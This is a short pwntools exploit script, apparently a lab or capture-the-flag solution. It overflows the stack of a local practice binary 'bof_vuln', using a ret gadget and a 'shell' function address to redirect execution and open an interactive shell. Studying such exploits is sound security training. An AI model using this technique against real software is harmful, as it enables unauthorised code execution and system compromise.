#!/usr/bin/env python3
from pwn import *
import subprocess

exe = ELF('../binary/bof_vuln')
rop = ROP(exe)

g = rop.find_gadget(['ret'])

if isinstance(g, int):
    ret_gadget = g
elif hasattr(g, 'address'):
    ret_gadget = g.address
elif isinstance(g, list):
    first = g[0]
    if isinstance(first, int):
        ret_gadget = first
    elif hasattr(first, 'address'):
        ret_gadget = first.address
    else:
        raise ValueError(f"Unknown gadget list format: {g!r}")
else:
    raise ValueError(f"Unknown gadget format: {g!r}")

mangled_name = ''
for s in exe.symbols:
    if 'shell' in s:
        mangled_name = s
        break

if not mangled_name:
    raise ValueError("Could not find a symbol with 'shell' in its name.")

try:
    demangled_name_bytes = subprocess.check_output(['c++filt', '-n', mangled_name])
    demangled_name = demangled_name_bytes.decode('utf-8').strip()
    log.info(f"Found symbol: {mangled_name} -> {demangled_name}")
except FileNotFoundError:
    log.error("Could not find 'c++filt'. Please install binutils.")
    demangled_name = "unknown"

shell_addr = exe.symbols[mangled_name]

offset = 64 + 8

log.info(f"Offset       = {offset}")
log.info(f"ret gadget   = {hex(ret_gadget)}")
log.info(f"shell() addr = {hex(shell_addr)}")

payload = flat(
    b"A" * offset,
    p64(ret_gadget),
    p64(shell_addr)
)

p = process(exe.path)
# p = gdb.debug(exe.path, gdbscript="b vuln\ncontinue")

p.sendline(payload)
p.interactive()